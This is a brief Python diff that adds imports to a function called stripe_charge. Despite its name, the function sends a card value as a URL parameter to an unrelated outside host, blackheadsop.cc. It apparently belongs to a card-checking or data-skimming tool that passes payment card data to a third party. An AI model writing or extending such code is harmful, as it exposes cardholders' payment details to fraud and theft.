@@ -1,3 +1,6 @@
+import requests
+import time
+
 def stripe_charge(card, message):
     
     response = requests.get(f'https://blackheadsop.cc/api/index.php?card={card}')
